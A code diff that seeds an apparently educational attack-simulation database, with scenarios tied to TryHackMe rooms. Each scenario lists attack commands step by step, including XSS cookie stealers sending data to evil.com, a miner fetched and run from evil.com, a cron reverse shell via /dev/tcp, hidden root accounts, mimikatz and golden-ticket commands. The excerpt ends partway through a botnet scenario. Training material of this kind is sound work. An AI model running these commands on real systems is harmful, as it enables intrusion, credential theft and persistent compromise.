@@ -32,7 +32,8 @@ def init_db():
         attack_type TEXT,
         difficulty TEXT,
         tryhackme_rooms TEXT,
-        forensics_rooms TEXT
+        forensics_rooms TEXT,
+        guide TEXT
     )''')
     
     cursor.execute('''CREATE TABLE attack_steps (
@@ -116,14 +117,15 @@ def init_db():
     # ==========================================
     # SCENARIO 1: Phishing & Credential Theft
     # ==========================================
-    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
-    VALUES (?, ?, ?, ?, ?, ?)''', 
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms, guide)
+    VALUES (?, ?, ?, ?, ?, ?, ?)''', 
     ('Phishing & Credential Theft', 
      'A user receives a malicious email and enters credentials on a fake login page',
      'Phishing',
      'Beginner',
      'Phishing|https://tryhackme.com/room/phishingyl;Intro to Social Engineering|https://tryhackme.com/room/introtosocialengineering;Nmap|https://tryhackme.com/room/nmap01',
-     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Email Analysis|https://tryhackme.com/room/youremailedphishing;Phishing Analysis|https://tryhackme.com/room/phishingemails2rytmuv'))
+     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Email Analysis|https://tryhackme.com/room/youremailedphishing;Phishing Analysis|https://tryhackme.com/room/phishingemails2rytmuv',
+     '<h4>Objective</h4><p>Execute a complete phishing attack chain from reconnaissance to lateral movement. You are targeting company.com employees.</p><h4>What You Will Learn</h4><ul><li>Network scanning with <code>nmap</code></li><li>Social engineering email crafting with <code>setoolkit</code></li><li>Website cloning with <code>httrack</code></li><li>Credential harvesting techniques</li></ul><h4>How to Clear</h4><ul><li>Step 1: Scan the target — use any nmap scan (e.g., <code>nmap -sV</code>)</li><li>Step 2: Craft phishing email — use <code>setoolkit</code> with phishing template</li><li>Step 3: Clone the login page — use <code>httrack</code> to clone the URL</li><li>Step 4: Send the email — use <code>sendmail</code> with spoofed address</li><li>Step 5: Capture credentials — start a listener with <code>harvest</code></li><li>Step 6: Move laterally — SSH into the target</li></ul><h4>Real-World Context</h4><p>The 2020 Twitter hack used social engineering to gain internal access. Phishing remains the #1 initial access vector in 91% of cyber attacks.</p>'))
     
     phishing_steps = [
         (1, 1, 'Attacker Reconnaissance', 'Profile the target company and identify email targets', 'gather_info',
@@ -609,6 +611,380 @@ ALERT: john.doe has 3 after-hours VPN sessions from unusual IP.''')
               (8,4,'Publish Malicious','Push to registry','publish','npm publish --tag latest','Publish package','v2.1.4 published | 3,200 installs in 24h'),
               (8,5,'Collect Data','Harvest stolen credentials','collect_data','nc -lvp 8443 >> stolen.txt','Listen for data','847 SSH keys, 1,204 API tokens received'),
               (8,6,'Pivot to Enterprise','Access high-value target','pivot','ssh -i stolen_key.pem admin@enterprise-target.com','SSH with stolen key','Access: enterprise-target.com | AWS root creds')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 9: XSS (Cross-Site Scripting)
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Cross-Site Scripting (XSS)', 'Inject malicious scripts into a trusted website to steal user data and session tokens',
+     'XSS', 'Beginner',
+     'XSS|https://tryhackme.com/room/xss;OWASP Top 10|https://tryhackme.com/room/owasptop10',
+     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
+    for s in [(9,1,'Find Input Fields','Identify user input points on the target web app','find_inputs','dirb http://target-app.com /usr/share/wordlists/common.txt','Use dirb to find pages with input fields','Discovered: /search, /comments, /profile, /contact | 4 input fields found'),
+              (9,2,'Test for Reflected XSS','Inject test script into search parameter','test_xss','curl http://target-app.com/search?q=<script>alert(1)</script>','Try injecting a script tag in the search','Parameter q reflects input without sanitization | XSS confirmed'),
+              (9,3,'Craft Cookie Stealer','Create payload to exfiltrate session cookies','craft_payload','python3 -c "print(\'<script>new Image().src=\"http://evil.com/steal?c=\"+document.cookie</script>\')"','Create a cookie-stealing XSS payload','Payload crafted: cookie exfiltration via image request to evil.com'),
+              (9,4,'Deploy Payload','Inject stored XSS into comment section','deploy_xss','curl -X POST http://target-app.com/comments -d "body=<script>fetch(\'http://evil.com/\'+document.cookie)</script>"','Post the XSS payload as a comment','Stored XSS injected in comments | Awaiting victim visits'),
+              (9,5,'Capture Sessions','Collect stolen session tokens from victims','capture','nc -lvp 80 | grep cookie','Listen for stolen cookies','Captured 12 session tokens | Admin session: PHPSESSID=a8f3b2c1'),
+              (9,6,'Account Takeover','Use stolen admin session to access admin panel','takeover','curl -b "PHPSESSID=a8f3b2c1" http://target-app.com/admin','Use the stolen cookie to access admin','Admin panel accessed | User data exposed | 2,500 accounts visible')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 10: Rogue Access Point
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Rogue Access Point', 'Set up a fake WiFi access point to intercept wireless traffic from unsuspecting users',
+     'WiFi Attack', 'Beginner',
+     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Network Services|https://tryhackme.com/room/networkservices',
+     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
+    for s in [(10,1,'Survey Wireless Networks','Scan for existing WiFi networks in the area','survey','airodump-ng wlan0mon','Use airodump-ng to scan for networks','Found: CoffeeShop-WiFi (ch6, WPA2), Guest-Net (open), Corp-WiFi (WPA2-Enterprise)'),
+              (10,2,'Create Rogue AP','Set up fake access point mimicking legitimate network','create_ap','hostapd-mana rogue_ap.conf --ssid CoffeeShop-WiFi','Use hostapd-mana to create rogue AP','Rogue AP active: CoffeeShop-WiFi | Channel 6 | Stronger signal than original'),
+              (10,3,'Configure DHCP','Assign IP addresses to connecting clients','dhcp','dnsmasq --dhcp-range=10.0.0.10,10.0.0.50 --interface=wlan0','Configure DHCP with dnsmasq','DHCP server running | Range: 10.0.0.10-50 | Gateway: 10.0.0.1'),
+              (10,4,'Enable Traffic Routing','Route victim traffic through attacker machine','route','iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080','Set up iptables for traffic redirect','Traffic routing enabled | HTTP redirected to proxy on port 8080'),
+              (10,5,'Capture Credentials','Intercept login credentials from connected users','capture','tcpdump -i wlan0 -w rogue_capture.pcap port 80 or port 443','Use tcpdump to capture traffic','5 clients connected | Captured HTTP POST to login.bank.com | Credentials visible'),
+              (10,6,'Extract Data','Analyze captured packets for sensitive information','extract','tshark -r rogue_capture.pcap -Y http.request.method==POST -T fields -e http.file_data','Extract POST data with tshark','Extracted 3 login credentials, 2 API keys, 1 session token from captured traffic')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 11: Rainbow Table Attack
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Rainbow Table Attack', 'Use precomputed hash tables to crack password hashes stolen from a database breach',
+     'Password Attack', 'Beginner',
+     'Crack the Hash|https://tryhackme.com/room/crackthehash;John the Ripper|https://tryhackme.com/room/johntheripper0',
+     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Log Analysis|https://tryhackme.com/room/introtologs'))
+    for s in [(11,1,'Obtain Hash Dump','Acquire password hashes from compromised database','get_hashes','mysqldump -u root -p --single-transaction target_db users > hash_dump.sql','Dump the users table with mysqldump','Extracted 5,200 password hashes | Algorithm: MD5 (unsalted)'),
+              (11,2,'Identify Hash Type','Determine the hashing algorithm used','identify','hashid -m hash_dump.txt','Use hashid to identify hash type','Hash type: MD5 (mode 0) | No salt detected | Vulnerable to rainbow table'),
+              (11,3,'Download Rainbow Tables','Get precomputed rainbow tables for MD5','download','wget http://rainbow-tables.com/md5_complete.rt','Download MD5 rainbow tables','Rainbow table downloaded: 24GB | Covers 8-char alphanumeric passwords'),
+              (11,4,'Run Rainbow Crack','Look up hashes against the rainbow table','crack','rcrack /tables/md5/ -h hash_dump.txt','Run rcrack against the hash dump','Cracked 3,847/5,200 hashes (74%) | Average time: 0.3s per hash'),
+              (11,5,'Crack Remaining Hashes','Use hashcat for remaining resistant hashes','remaining','hashcat -m 0 -a 0 remaining_hashes.txt rockyou.txt','Use hashcat with rockyou wordlist','Additional 892 hashes cracked | Total: 4,739/5,200 (91%)'),
+              (11,6,'Credential Validation','Test cracked credentials against live services','validate','hydra -L users.txt -P cracked_passes.txt target.com ssh','Use hydra to test credentials','Valid logins found: 847 accounts | 12 admin accounts compromised')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 12: Social Engineering
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Social Engineering Attacks', 'Manipulate people through pretexting and vishing to gain unauthorized access to systems',
+     'Social Engineering', 'Beginner',
+     'Intro to Social Engineering|https://tryhackme.com/room/introtosocialengineering;Phishing|https://tryhackme.com/room/phishingyl',
+     'Email Analysis|https://tryhackme.com/room/youremailedphishing;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(12,1,'OSINT Reconnaissance','Gather target employee information from social media','osint','maltego --target "AcmeCorp" --transform social_media','Use Maltego for social media OSINT','Found: 45 employees on LinkedIn | CEO: John Smith | IT Admin: Sarah Lee'),
+              (12,2,'Craft Pretext','Create convincing cover story for social engineering','pretext','gophish --campaign new --template it_support_verification','Set up GoPhish campaign with pretext','Pretext ready: IT support calling about security audit | Caller ID spoofed'),
+              (12,3,'Vishing Call','Call target pretending to be IT support','vish','spoofcard --caller-id +1-555-ACME --target sarah.lee','Spoof caller ID to match company number','Called Sarah Lee as IT Support | She confirmed her employee ID and VPN password'),
+              (12,4,'Credential Harvesting','Use obtained info to access systems','harvest','ssh sarah.lee@acme-vpn.com','SSH with social engineered credentials','VPN access granted | Internal network visible | LDAP directory accessible'),
+              (12,5,'Privilege Escalation','Exploit trust to get admin credentials','escalate','ldapsearch -x -H ldap://dc01.acme.local -b "dc=acme,dc=local" "(adminCount=1)"','Query LDAP for admin accounts','Found 3 domain admin accounts | Password policy: 90-day rotation'),
+              (12,6,'Data Access','Access confidential files using elevated privileges','access','smbclient //fileserver.acme.local/confidential -U admin','Access confidential file share','Accessed: /confidential/financials/ | 2,300 files | Trade secrets exposed')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 13: Cryptojacking
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Cryptojacking', 'Hijack computing resources to mine cryptocurrency without the owner knowing',
+     'Cryptojacking', 'Beginner',
+     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
+     'Volatility|https://tryhackme.com/room/volatility;YARA|https://tryhackme.com/room/yara'))
+    for s in [(13,1,'Find Vulnerable Servers','Scan for exposed web servers with known CVEs','scan','nmap -sV --script vuln 10.0.0.0/24','Use nmap vuln scripts to find targets','Found 3 servers with Apache Struts CVE-2017-5638 | Port 8080 open'),
+              (13,2,'Exploit Entry Point','Gain access through vulnerable service','exploit','msfconsole -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 10.0.0.15; run"','Use Metasploit Struts exploit','Shell obtained on 10.0.0.15 | User: www-data | OS: Ubuntu 20.04'),
+              (13,3,'Deploy Miner','Install cryptocurrency mining software','deploy','wget -q http://evil.com/xmrig -O /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache -o pool.evil.com','Download and run XMRig miner','XMRig deployed | Mining Monero | Pool: pool.evil.com | CPU usage: 95%'),
+              (13,4,'Setup Persistence','Ensure miner survives reboots','persist','echo "@reboot /tmp/.cache -o pool.evil.com" | crontab -','Add miner to crontab','Crontab persistence installed | Miner restarts on reboot | Process disguised as [kworker]'),
+              (13,5,'Spread to Network','Propagate miner to other machines on network','spread','psexec.py admin:P@ssw0rd@10.0.0.16 cmd /c "powershell -ep bypass -c IEX(curl http://evil.com/miner.ps1)"','Use psexec to spread to other machines','Miner deployed on 10.0.0.16, 10.0.0.17 | Total CPU hijacked: 12 cores'),
+              (13,6,'Collect Revenue','Monitor mining pool for earned cryptocurrency','collect','curl https://pool.evil.com/api/stats?wallet=44AFFq5 | python3 -m json.tool','Check mining pool stats','Mining stats: 1.2 KH/s | Earned: 0.47 XMR ($78) | Targets unaware for 45 days')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 14: Backdoor Installation
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Backdoor Installation', 'Plant a persistent backdoor on a compromised system for ongoing remote access',
+     'Backdoor', 'Intermediate',
+     'Metasploit Introduction|https://tryhackme.com/room/metasploitintro;Linux PrivEsc|https://tryhackme.com/room/linprivesc',
+     'Volatility|https://tryhackme.com/room/volatility;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(14,1,'Initial Access','Exploit vulnerable service to gain shell','access','msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; run"','Use Metasploit vsftpd exploit','Shell on 10.0.0.20 | User: daemon | vsftpd 2.3.4 exploited'),
+              (14,2,'Privilege Escalation','Escalate to root via kernel exploit','privesc','searchsploit linux kernel 5.4 privilege escalation','Search for kernel exploits','CVE-2021-4034 (PwnKit) found | Compiling exploit...'),
+              (14,3,'Install Backdoor','Deploy persistent reverse shell','install','echo "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" > /etc/cron.daily/update','Add reverse shell to cron','Backdoor installed in /etc/cron.daily/update | Runs daily'),
+              (14,4,'Create SSH Key','Plant SSH key for passwordless access','ssh_key','echo "ssh-rsa AAAA...attacker_key" >> /root/.ssh/authorized_keys','Add SSH key to root authorized_keys','SSH key planted | Attacker can SSH as root without password'),
+              (14,5,'Hide Backdoor','Conceal backdoor from detection','hide','touch -r /etc/cron.daily/logrotate /etc/cron.daily/update && chattr +i /etc/cron.daily/update','Match timestamps and make file immutable','Timestamps matched to logrotate | File set immutable | Hidden from ls -la'),
+              (14,6,'Test Persistence','Verify backdoor survives reboot','test','ssh -i attacker_key root@10.0.0.20 "id && hostname && cat /etc/shadow | head -3"','SSH with planted key to verify access','Root access confirmed after reboot | Shadow file readable | Backdoor persistent')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 15: Privilege Escalation
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Privilege Escalation', 'Escalate from low-privilege user to root/admin through misconfigurations and exploits',
+     'PrivEsc', 'Intermediate',
+     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20',
+     'Incident Response|https://tryhackme.com/room/introtoir;Volatility|https://tryhackme.com/room/volatility'))
+    for s in [(15,1,'Enumerate System','Gather system info and find weaknesses','enum','linpeas.sh | tee /tmp/linpeas_output.txt','Run LinPEAS for automated enumeration','OS: Ubuntu 20.04 | Kernel: 5.4.0 | SUID binaries: 12 found | Writable /etc/passwd'),
+              (15,2,'Check SUID Binaries','Find exploitable SUID programs','suid','find / -perm -4000 -type f 2>/dev/null','Find all SUID binaries','SUID: /usr/bin/find, /usr/bin/python3, /usr/bin/pkexec | python3 is exploitable!'),
+              (15,3,'Exploit SUID Python','Use SUID python3 to spawn root shell','exploit_suid','python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"','Exploit SUID python3 for root','Root shell obtained via SUID python3! | uid=0(root) gid=0(root)'),
+              (15,4,'Dump Credentials','Extract password hashes from shadow file','dump','unshadow /etc/passwd /etc/shadow > hashes.txt','Combine passwd and shadow files','8 user hashes extracted | Root hash: $6$rounds=5000$...'),
+              (15,5,'Crack Root Hash','Crack the root password hash','crack','john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt','Use John the Ripper to crack hashes','Root password cracked: Summer2024! | 3 other accounts cracked'),
+              (15,6,'Establish Persistence','Create hidden admin account','persist','useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysbackup','Create hidden root-level user','Hidden user sysbackup created with UID 0 | Persistent root access established')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 16: Session Hijacking
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Session Hijacking', 'Steal active web session tokens to impersonate authenticated users',
+     'Session Hijacking', 'Intermediate',
+     'OWASP Top 10|https://tryhackme.com/room/owasptop10;Burp Suite Basics|https://tryhackme.com/room/burpsuitebasics',
+     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
+    for s in [(16,1,'Intercept Traffic','Capture network traffic on shared network','intercept','wireshark -i eth0 -f "tcp port 80" -w session_capture.pcap','Capture HTTP traffic with Wireshark','Capturing packets on eth0 | Filter: TCP port 80 | 2,341 packets captured'),
+              (16,2,'Extract Session Cookies','Find session tokens in captured traffic','extract','tshark -r session_capture.pcap -Y "http.cookie" -T fields -e http.cookie','Extract cookies with tshark','Found 15 session cookies | Target: JSESSIONID=ABC123DEF456 (admin user)'),
+              (16,3,'Validate Session','Check if stolen session is still active','validate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/api/whoami','Test the stolen session cookie','Session valid | User: admin@target-app.com | Role: administrator | Expires: 2h'),
+              (16,4,'Impersonate User','Use stolen session to access admin panel','impersonate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/dashboard','Access admin dashboard with stolen session','Admin dashboard accessed | 15,000 user accounts visible | System settings exposed'),
+              (16,5,'Escalate Access','Modify user permissions via admin panel','escalate','curl -X PUT -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/users/1 -d "role=superadmin"','Elevate attacker account to superadmin','Attacker account elevated to superadmin | Full system control obtained'),
+              (16,6,'Exfiltrate Data','Download sensitive data through admin API','exfiltrate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/export/users > stolen_users.csv','Export user database via admin API','Exported 15,000 user records | Includes emails, hashed passwords, PII')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 17: Spyware & Keyloggers
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Spyware & Keyloggers', 'Deploy spyware to secretly monitor user activity and capture keystrokes',
+     'Spyware', 'Intermediate',
+     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;History of Malware|https://tryhackme.com/room/historyofmalware',
+     'REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;Volatility|https://tryhackme.com/room/volatility'))
+    for s in [(17,1,'Create Keylogger','Build a keylogger payload with screenshot capture','create','msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 -f exe -o screensaver.exe','Generate keylogger payload with msfvenom','Payload: screensaver.exe | 68KB | Includes keylogger + screenshot modules'),
+              (17,2,'Social Engineering Delivery','Send payload disguised as software update','deliver','sendmail --to target@company.com --attach screensaver.exe --subject "Required Security Update"','Email the payload as a fake update','Email sent to target@company.com | Subject: Required Security Update | Attachment: screensaver.exe'),
+              (17,3,'Activate Keylogger','Start keystroke capture on victim machine','activate','meterpreter> keyscan_start','Start keylogger in meterpreter session','Keylogger activated | Capturing all keystrokes | Buffer recording started'),
+              (17,4,'Capture Screenshots','Take periodic screenshots of victim desktop','screenshot','meterpreter> screenshot -p /loot/ -v true -q 75','Take screenshots via meterpreter','15 screenshots captured | Includes: email client, banking site, password manager'),
+              (17,5,'Dump Keystrokes','Retrieve captured keystrokes from buffer','dump','meterpreter> keyscan_dump','Dump captured keystrokes','Keystrokes captured: email passwords, bank login, credit card number typed in browser'),
+              (17,6,'Exfiltrate Data','Send collected data to attacker server','exfiltrate','meterpreter> download /loot/ /home/attacker/stolen_data/','Download all captured data','Exfiltrated: 847 keystrokes, 15 screenshots, 3 credential pairs, 1 credit card')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 18: Evil Twin Attack
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Evil Twin Attack', 'Clone a legitimate WiFi network to lure users and intercept their traffic',
+     'WiFi Attack', 'Intermediate',
+     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Wireshark|https://tryhackme.com/room/wireshark',
+     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
+    for s in [(18,1,'Monitor Mode','Put wireless adapter into monitor mode','monitor','airmon-ng start wlan0','Enable monitor mode with airmon-ng','Monitor mode enabled on wlan0mon | Ready to scan wireless networks'),
+              (18,2,'Scan Networks','Identify target WiFi network details','scan','airodump-ng wlan0mon --band abg','Scan all bands with airodump-ng','Target: CorpWiFi | BSSID: AA:BB:CC:DD:EE:FF | Channel: 11 | WPA2 | 25 clients'),
+              (18,3,'Deauth Clients','Force clients off legitimate AP','deauth','aireplay-ng --deauth 50 -a AA:BB:CC:DD:EE:FF wlan0mon','Send deauth packets to kick clients','Deauth sent | 25 clients disconnected from CorpWiFi | Clients searching for network'),
+              (18,4,'Create Evil Twin','Launch identical fake AP with captive portal','evil_twin','fluxion --target CorpWiFi --attack captive_portal','Use Fluxion to create evil twin','Evil Twin active: CorpWiFi | Captive portal: fake login page | 18 clients connected'),
+              (18,5,'Capture WPA Key','Harvest WPA password from captive portal','capture_key','cat /tmp/fluxion/captured_keys.txt','Read captured WPA keys','WPA2 password captured: C0rpW1f!2024 | Submitted by 3 different users'),
+              (18,6,'Access Network','Connect to real network with stolen credentials','access','nmcli device wifi connect CorpWiFi password C0rpW1f!2024','Connect to real AP with stolen password','Connected to CorpWiFi | Internal network: 172.16.0.0/16 | Domain controller visible')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 19: Handshake Capture
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('WPA Handshake Capture', 'Capture and crack WPA/WPA2 4-way handshake to obtain WiFi password',
+     'WiFi Attack', 'Intermediate',
+     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Crack the Hash|https://tryhackme.com/room/crackthehash',
+     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
+    for s in [(19,1,'Enable Monitor','Set wireless card to monitor mode','monitor','airmon-ng start wlan0','Start monitor mode','wlan0mon active | Chipset: Atheros AR9271 | Monitor mode enabled'),
+              (19,2,'Target Network','Identify and lock onto target AP','target','airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0mon','Focus airodump on target AP','Locked on: HomeNet-5G | Channel 6 | 4 clients connected | Waiting for handshake'),
+              (19,3,'Force Handshake','Deauth a client to force re-authentication','deauth','aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c FF:EE:DD:CC:BB:AA wlan0mon','Deauth one client to trigger handshake','Deauth sent to client FF:EE:DD | Client reconnecting... WPA handshake captured!'),
+              (19,4,'Verify Capture','Confirm valid 4-way handshake was captured','verify','aircrack-ng capture-01.cap','Check capture file with aircrack-ng','Valid WPA2 handshake found | EAPOL frames: 4/4 | Ready for cracking'),
+              (19,5,'Crack with Wordlist','Use dictionary attack to crack the handshake','crack','aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap','Crack with rockyou wordlist','KEY FOUND: P@ssw0rd123 | Time: 4m 32s | 28,000 keys tested'),
+              (19,6,'Verify Access','Connect to network with cracked password','connect','nmcli device wifi connect HomeNet-5G password P@ssw0rd123','Connect using cracked password','Connected to HomeNet-5G | IP: 192.168.1.105 | Gateway: 192.168.1.1 | Full access')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 20: Pass the Hash
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Pass the Hash', 'Use stolen NTLM password hashes to authenticate without knowing the actual password',
+     'Credential Abuse', 'Intermediate',
+     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Active Directory|https://tryhackme.com/room/attacktivedirectory',
+     'Windows Forensics|https://tryhackme.com/room/introtoir;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(20,1,'Gain Initial Access','Compromise a workstation on the network','access','msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.50; run"','Use EternalBlue to gain access','Meterpreter session on WORKSTATION-01 | User: corp\\jsmith | OS: Windows 10'),
+              (20,2,'Dump NTLM Hashes','Extract password hashes from memory','dump','mimikatz "privilege::debug" "sekurlsa::logonpasswords"','Run Mimikatz to dump hashes','NTLM hash: Administrator:500:aad3b435...:::  | Domain: CORP | 5 hashes dumped'),
+              (20,3,'Identify Targets','Find machines where admin hash is valid','scan','crackmapexec smb 10.0.0.0/24 -u Administrator -H aad3b435... --shares','Use CrackMapExec to test hash across network','Admin hash valid on: DC01, FILESERVER, SQLSERVER | 3/15 hosts pwnable'),
+              (20,4,'Pass the Hash','Authenticate to domain controller using hash','pth','psexec.py -hashes aad3b435...:aad3b435... Administrator@10.0.0.10','Use psexec with NTLM hash','SYSTEM shell on DC01 (10.0.0.10) | Domain Controller compromised'),
+              (20,5,'Extract Domain Secrets','Dump entire Active Directory database','secrets','secretsdump.py -hashes aad3b435...:aad3b435... Administrator@10.0.0.10','Dump AD secrets with secretsdump','NTDS.dit dumped | 2,500 domain user hashes | 15 domain admin accounts'),
+              (20,6,'Golden Ticket','Create persistent Kerberos golden ticket','golden','ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain corp.local Administrator','Create golden ticket with ticketer.py','Golden ticket created | Unlimited domain admin access | Valid for 10 years')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 21: Botnets
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Botnet Command & Control', 'Build and operate a botnet infrastructure for coordinated attacks',
+     'Botnet', 'Intermediate',
+     'Nmap|https://tryhackme.com/room/nmap01;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
+     'Wireshark|https://tryhackme.com/room/wireshark;Snort|https://tryhackme.com/room/snort'))
+    for s in [(21,1,'Setup C2 Server','Deploy command and control infrastructure','setup_c2','python3 c2_server.py --port 8443 --ssl --beacon-interval 60','Start C2 server with SSL','C2 active on port 8443 | SSL enabled | Beacon interval: 60s | Dashboard ready'),
+              (21,2,'Create Bot Payload','Generate bot agent for distribution','create_bot','msfvenom -p python/meterpreter/reverse_https LHOST=c2.evil.com LPORT=8443 -f raw -o bot.py','Create bot agent with msfvenom','Bot agent: bot.py | Connects to c2.evil.com:8443 | Anti-detection: process injection'),
+              (21,3,'Mass Distribution','Spread bot via phishing campaign','distribute','gophish --campaign botnet_spread --targets email_list.csv --attachment bot.py','Launch phishing campaign with GoPhish','Campaign sent to 10,000 targets | Open rate: 23% | Infection rate: 8% | 800 bots'),
